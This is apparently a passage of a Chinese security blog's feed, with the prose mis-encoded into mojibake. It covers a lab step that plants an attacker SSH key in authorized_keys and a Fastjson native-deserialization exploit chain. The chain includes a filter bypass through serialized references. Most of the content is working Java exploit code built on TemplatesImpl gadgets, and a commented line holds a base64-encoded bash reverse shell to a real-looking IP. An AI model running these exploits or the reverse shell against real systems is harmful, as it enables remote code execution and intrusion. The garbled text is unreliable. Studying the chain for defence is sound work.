AAAAB3NzaC1yc2EAAAADAQABAAACAQDjPlOojvCChYma6vh0Wgt0pV0cgnVWIc/sf6M/J1xsHfYxT+gkzc9sl3FEbcv6gSh5t6wCVbXip5kbLqFaBbICjb6ckb7JGnTpJvOXIzf2Le8b9huW2SRlmoWItZIMWfAsc/3lO/qNDSw0izGg7N5txsGYF03hpFrx9PDsx/IsVp1pG07LeYHWY/hNutSayfTU6doa4+qFKFTXoaZ6yQZAMCAaaj8M/gqmMl5NE+l0N6kH4lGgAoZ9oxlxcoL6h2AkrUmbCVnZzShzy9aH6/cel9Muct/wexsQq57mgE0ExEhMj7tuS6kP4dyrxpeycf5t8wY6y4/0tSpUB93zAqqVlw3GxX7VA4XofeNnJR+uu4xmDCkdN3hSy3+oXja6Q26vAzY/A00PADE4JQjdQyJzkuuJAv7u4iD0oXnqjiXJLqAWNn81Gh/VDjHy/hTUsmYPJNtjzOuYmNwYzBy/tpNIh61RYMVKm6JanahG8ViZckOn2gBaX4JhFcNcJsm457gfF5y/2lGaOhKt8PI3Fc9DZT5n134uarDx+HNznVWbig28DIzgki/eqxQU+0Ocw3iD+PrddwqeyBh/8F6xLYoew52gzqExaqkUOtgT0kmZol4JJCd5gQu0k0Ow0tnUpSCl1TXS/aCCL3u2eKQXf0TbKHsgjTKI5am9HuQEuBKHww== root@kali&quot;</span> &gt; authorized_keys</span><br></pre></td></tr></table></figure><p>ç„¶ååˆ©ç”¨ç§é’¥sshè¿æ¥ç™»å½•å®¿ä¸»æœºï¼Œé™¤äº†å‘½ä»¤ä¹‹å¤–è¿˜å¯ä»¥ç”¨sshè½¯ä»¶å¯¼å…¥ç§é’¥ç™»å½•</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains ssh -i  /root/.ssh/id_rsa root@<span class="number">172.22</span><span class="number">.14</span><span class="number">.37</span></span><br></pre></td></tr></table></figure><p><img src="assets/image-20240603233216-no3pt3n.png" alt="image">â€‹</p><p>åœ¨æ•°æ®åº“ä¸­æ‹¿åˆ°flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ZmxhZ3tkYTY5YzQ1OS03ZmU1LTQ1MzUtYjhkMS0xNWZmZjQ5NmEyOWZ9Cg==</span><br></pre></td></tr></table></figure><p>flag04ï¼šflag{da69c459-7fe5-4535-b8d1-15fff496a29f}</p>]]></content>
    
    
    <summary type="html">æ•´ç†çš„ç¬”è®°</summary>
    
    
    
    <category term="æ¸—é€" scheme="https://bowuchuling.github.io/categories/%E6%B8%97%E9%80%8F/"/>
    
    <category term="ç¬”è®°" scheme="https://bowuchuling.github.io/categories/%E6%B8%97%E9%80%8F/%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="ç¬”è®°" scheme="https://bowuchuling.github.io/tags/%E7%AC%94%E8%AE%B0/"/>
    
    <category term="æ¸—é€" scheme="https://bowuchuling.github.io/tags/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>FastjsonåŸç”Ÿååºåˆ—åŒ–</title>
    <link href="https://bowuchuling.github.io/posts/1997i0jz.html"/>
    <id>https://bowuchuling.github.io/posts/1997i0jz.html</id>
    <published>2024-04-19T14:34:33.847Z</published>
    <updated>2024-04-19T14:36:58.505Z</updated>
    
    <content type="html"><![CDATA[<h1>FastjsonåŸç”Ÿååºåˆ—åŒ–</h1><h2 id="fj1-1-2-48-fj2-2-0-26-ç›®å‰">fj1&lt;=1.2.48 &amp; fj2&lt;2.0.26(ç›®å‰)</h2><p>å…ˆç»™å‡ºEXP</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONArray;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">ct</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;E:\\æ¼æ´å¤ç°\\fjyuansheng\\target\\classes\\Calc.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] bytes = &#123;code&#125;;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">ctDeclaredField</span> <span class="operator">=</span> ct.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        ctDeclaredField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        ctDeclaredField.set(templates,bytes);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> ct.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templates,<span class="string">&quot;Chu0&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> ct.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactory.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">JSONArray</span> <span class="variable">jsonArray</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONArray</span>();</span><br><span class="line">        jsonArray.add(templates);</span><br><span class="line"></span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> BadAttributeValueExpException.class;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">val</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        val.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        val.set(badAttributeValueExpException,jsonArray);</span><br><span class="line"></span><br><span class="line">        serialize(badAttributeValueExpException);</span><br><span class="line">        unserialize(<span class="string">&quot;./ser.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(badAttributeValueExpException);</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line">        <span class="type">byte</span>[] serialize = byteArrayOutputStream.toByteArray();</span><br><span class="line">        System.out.println(Base64.getEncoder().encodeToString(serialize));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;./ser.bin&quot;</span>));</span><br><span class="line">        objectOutputStream.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> objectInputStream.readObject();</span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸ªäººè¿˜æ˜¯æ¯”è¾ƒå–œæ¬¢è¿™æ¡é“¾å­ï¼Œä¹Ÿæ˜¯å±äºfjçš„çœŸåŸç”Ÿååºåˆ—åŒ–äº†</p><p>åˆ©ç”¨BadAttributeValueExpException#readObjctä¸­å¯¹äºreadObjectçš„è°ƒç”¨è°ƒç”¨fjä¸­çš„JSON#toString</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240419150339444.png" alt="image-20240419150339444"></p><p>ç”±äºJSONä¸ºæŠ½è±¡ç±»ï¼Œæ‰€ä»¥æˆ‘ä»¬é€‰ç”¨ç»§æ‰¿ä»–çš„JSONArray</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240419151012146.png" alt="image-20240419151012146"></p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240419151000689.png" alt="image-20240419151000689"></p><p>åœ¨toJsonStringä¸­è°ƒç”¨ä¼ å…¥ç±»çš„getteræ–¹æ³•ï¼Œç»“åˆBadAttributeValueExpExceptionçš„tostringè°ƒç”¨ï¼Œå³å¯å°†é“¾å­è¿æ¥èµ·æ¥</p><h2 id="fj-1-2-48">fj&gt;1.2.48</h2><h3 id="WAFåˆ†æ">WAFåˆ†æ</h3><p>49ç‰ˆæœ¬å¯¹äºJSONArrayç±»è¿›è¡Œäº†readObjectç±»çš„é‡å†™ï¼Œåœ¨å…¶ä¸­è°ƒç”¨äº†resoleveClass</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240419194302593.png" alt="image-20240419194302593"></p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240419194333923.png" alt="image-20240419194333923"></p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240419194249623.png" alt="image-20240419194249623"></p><p>åœ¨è¿™é‡Œè°ƒç”¨äº†checkAutoTypeå¯¹æ¶æ„ç±»è¿›è¡Œäº†wafï¼Œå¯¹fjäº†è§£çš„å¸ˆå‚…åº”è¯¥å¯¹è¿™ä¸ªå‡½æ•°å¹¶ä¸é™Œç”Ÿ</p><h3 id="ç»•è¿‡æ€è·¯">ç»•è¿‡æ€è·¯</h3><p>å¦‚ä½•ç»•è¿‡resoleveClassçš„æ£€æµ‹ï¼Ÿ</p><p>æˆ‘ä»¬æŸ¥çœ‹ObjectInputStream#readObject0çš„æºç </p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240419220059491.png" alt="image-20240419220059491"></p><p>æˆ‘ä»¬çœ‹switchéƒ¨åˆ†ï¼Œä¸ä¼šè°ƒç”¨resoleveClassçš„å°±åªæœ‰TC_NULLã€TC_REFERENCEã€TC_LONGSTRINGã€TC_EXCEPTIONã€TC_STRINGè¿™å‡ ç§ï¼Œä½†æ˜¯å…¶ä¸­æœ‰ç”¨çš„å°±åªæœ‰referenceå¼•ç”¨ç±»å‹äº†</p><h3 id="ç»•è¿‡æ­¥éª¤">ç»•è¿‡æ­¥éª¤</h3><p>æµ‹è¯•demo</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONArray;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        ArrayList&lt;Object&gt; arrayList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        arrayList.add(templates);</span><br><span class="line">        arrayList.add(templates);</span><br><span class="line">        serialize(arrayList);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;./ser.bin&quot;</span>));</span><br><span class="line">        objectOutputStream.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> objectInputStream.readObject();</span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬æ–­ç‚¹è¿è¡Œä¸€ä¸‹</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240419220820005.png" alt="image-20240419220820005"></p><p>æˆ‘ä»¬è§‚å¯Ÿè°ƒç”¨æ ˆå’Œæ–­ç‚¹ä½ç½®ï¼Œè¿™é‡Œçš„elementDataå°±å­˜å‚¨çš„æˆ‘ä»¬ä¼ å…¥çš„ä¸¤ä¸ªtemplateså¯¹è±¡ï¼Œè·Ÿè¿›writeObjectï¼ˆObjectOutputStream#writeObjectï¼‰æ–¹æ³•</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240419221015780.png" alt="image-20240419221015780"></p><p>å…¶è°ƒç”¨äº†writeObject0æ–¹æ³•ï¼Œæˆ‘ä»¬ç»§ç»­è·Ÿè¿›</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240419221057050.png" alt="image-20240419221057050"></p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240419221416066.png" alt="image-20240419221416066"></p><p>å¯ä»¥å‘ç°åœ¨æ–­ç‚¹å¤„ï¼Œå¦‚æœæˆ‘ä»¬ä¼ å…¥çš„å¯¹è±¡æ˜¯å·²ç»å­˜åœ¨çš„ï¼Œé‚£ä¹ˆå°±ä¼šè°ƒç”¨writeHandleå†™å…¥ï¼Œä¹Ÿå°±æ˜¯å¼•ç”¨å†™å…¥ï¼Œè¿™æ ·å°±å°†æˆ‘ä»¬çš„templatesä»¥referenceæ ¼å¼å†™äº†è¿›å»ï¼Œè¿›è€Œå®Œæˆäº†ç»•è¿‡</p><p>ç®€å•æ•´ç†ï¼š</p><p>åºåˆ—åŒ–æ—¶ï¼Œåœ¨è¿™é‡Œtemplateså…ˆåŠ å…¥åˆ°arrayListä¸­ï¼Œåé¢åœ¨JSONArrayä¸­å†æ¬¡åºåˆ—åŒ–TemplatesImplæ—¶ï¼Œç”±äºåœ¨<code>handles</code>è¿™ä¸ªhashè¡¨ä¸­æŸ¥åˆ°äº†æ˜ å°„ï¼Œåç»­åˆ™ä¼šä»¥å¼•ç”¨å½¢å¼è¾“å‡º</p><p>ååºåˆ—åŒ–æ—¶ArrayListå…ˆé€šè¿‡readObjectæ¢å¤TemplatesImplå¯¹è±¡ï¼Œä¹‹åæ¢å¤BadAttributeValueExpExceptionå¯¹è±¡ï¼Œåœ¨æ¢å¤è¿‡ç¨‹ä¸­ï¼Œç”±äºBadAttributeValueExpExceptionè¦æ¢å¤valå¯¹åº”çš„JSONArray/JSONObjectå¯¹è±¡ï¼Œä¼šè§¦å‘JSONArray/JSONObjectçš„readObjectæ–¹æ³•ï¼Œå°†è¿™ä¸ªè¿‡ç¨‹å§”æ‰˜ç»™<code>SecureObjectInputStream</code>ï¼Œåœ¨æ¢å¤JSONArray/JSONObjectä¸­çš„TemplatesImplå¯¹è±¡æ—¶ï¼Œç”±äºæ­¤æ—¶çš„ç¬¬äºŒä¸ªTemplatesImplå¯¹è±¡æ˜¯å¼•ç”¨ç±»å‹ï¼Œé€šè¿‡readHandleæ¢å¤å¯¹è±¡çš„é€”ä¸­ä¸ä¼šè§¦å‘resolveClassï¼Œç”±æ­¤å®ç°äº†ç»•è¿‡</p><p>å½“ç„¶å‰é¢ä¹Ÿæåˆ°äº†ä¸ä»…ä»…æ˜¯Listï¼ŒSetä¸Mapç±»å‹éƒ½èƒ½æˆåŠŸè§¦å‘å¼•ç”¨ç»•è¿‡ã€‚</p><h3 id="exp">exp</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONArray;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtConstructor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestPayload</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] genPayload(String cmd) <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">clazz</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;a&quot;</span>);</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">superClass</span> <span class="operator">=</span> pool.get(AbstractTranslet.class.getName());</span><br><span class="line">        clazz.setSuperclass(superClass);</span><br><span class="line">        <span class="type">CtConstructor</span> <span class="variable">constructor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtConstructor</span>(<span class="keyword">new</span> <span class="title class_">CtClass</span>[]&#123;&#125;, clazz);</span><br><span class="line">        constructor.setBody(<span class="string">&quot;Runtime.getRuntime().exec(\&quot;&quot;</span>+cmd+<span class="string">&quot;\&quot;);&quot;</span>);</span><br><span class="line">        clazz.addConstructor(constructor);</span><br><span class="line">        clazz.getClassFile().setMajorVersion(<span class="number">49</span>);</span><br><span class="line">        <span class="keyword">return</span> clazz.toBytecode();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//        TemplatesImpl templates = TemplatesImpl.class.newInstance();</span></span><br><span class="line"><span class="comment">//        setValue(templates, &quot;_bytecodes&quot;, new byte[][]&#123;genPayload(&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTAuNDEuMTcuMTgzLzI1MCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;)&#125;);</span></span><br><span class="line"><span class="comment">//        setValue(templates, &quot;_name&quot;, &quot;qiu&quot;);</span></span><br><span class="line"><span class="comment">//        setValue(templates, &quot;_tfactory&quot;, null);</span></span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">ct</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;E:\\æ¼æ´å¤ç°\\fjyuansheng\\target\\classes\\shell.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] bytes = &#123;code&#125;;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">ctDeclaredField</span> <span class="operator">=</span> ct.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        ctDeclaredField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        ctDeclaredField.set(templates,bytes);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> ct.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templates,<span class="string">&quot;Chu0&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> ct.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactory.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">JSONArray</span> <span class="variable">jsonArray</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONArray</span>();</span><br><span class="line">        jsonArray.add(templates);</span><br><span class="line"></span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">bd</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">        setValue(bd, <span class="string">&quot;val&quot;</span>, jsonArray);</span><br><span class="line"></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        hashMap.put(templates, bd);</span><br><span class="line"></span><br><span class="line">        serialize(hashMap);</span><br><span class="line">        unserialize(<span class="string">&quot;./ser.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(hashMap);</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line">        <span class="type">byte</span>[] serialize = byteArrayOutputStream.toByteArray();</span><br><span class="line">        System.out.println(Base64.getEncoder().encodeToString(serialize));</span><br><span class="line"><span class="comment">//                